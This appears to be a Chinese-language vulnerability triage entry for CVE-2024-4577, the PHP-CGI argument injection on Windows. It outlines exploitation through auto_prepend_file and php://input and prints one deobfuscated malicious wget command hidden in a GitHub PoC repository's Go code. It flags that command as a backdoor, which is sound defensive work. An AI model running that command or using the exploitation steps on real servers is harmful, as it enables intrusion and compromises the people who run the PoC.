## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 参数注入/远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行、源码泄露

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI mode)

**利用条件:** Windows系统, PHP以CGI模式运行, 启用了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 80%

## 详情

CVE-2024-4577是一个存在于PHP的Windows版本中的漏洞，当PHP以CGI模式运行时，如果系统配置为使用特定的代码页，Windows可能会使用"Best-Fit"行为来替换命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许攻击者向PHP二进制文件传递选项。攻击者可以利用该漏洞来执行任意PHP代码，泄露源代码，甚至在服务器上运行任意操作系统命令。

**有效性：**
提供的Go和Python POC代码都尝试通过`auto_prepend_file`和`allow_url_include`设置，包含phpinfo()的payload来验证漏洞是否存在。 如果目标系统返回包含"PHP Version"的响应，则表明漏洞存在。根据漏洞描述和提供的资料，这些POC利用方式是有效的。

**投毒风险：**
*   **Go版本:** 在提供的Go代码中，`nFPfVl()` 函数包含混淆的代码，尝试执行 shell 命令。 解混淆后的代码为：`wget http://tvhgw/kaiFRE-0asbd|e/bpdc/ /c /3nadeag5 -t6 uo/tat.fe33`。这显然是一个恶意命令，尝试从一个未知的URL下载文件并执行。因此，Go版本的PoC **存在高危投毒风险**。

*   **Python版本:** Python版本的PoC相对干净，主要是发送包含phpinfo()的请求并判断是否成功，**未发现明显的投毒代码**，但是也可能存在通过打印或者其它方法进行投毒，投毒的可能性较低。

综合评价，考虑到Go代码中`nFPfVl`函数的存在，认为此仓库的投毒风险较高。Python版本代码看起来比较正常，相对较为安全。

**利用方式：**
1.  攻击者发送特制的HTTP请求到目标服务器上的PHP CGI程序。
2.  该请求包含经过编码的恶意字符，这些字符会被Windows的"Best-Fit"代码页转换机制所修改。
3.  修改后的字符会被PHP CGI模块错误地解析为PHP配置选项，如`auto_prepend_file`和`allow_url_include`。
4.  攻击者可以使用`auto_prepend_file`选项来包含远程文件或输入流（`php://input`），从而执行任意PHP代码。
5.  攻击者可以利用执行的PHP代码读取源代码，或者执行操作系统命令。

**项目地址:** [deadlybangle/CVE-2024-4577-PHP-RCE](https://github.com/deadlybangle/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)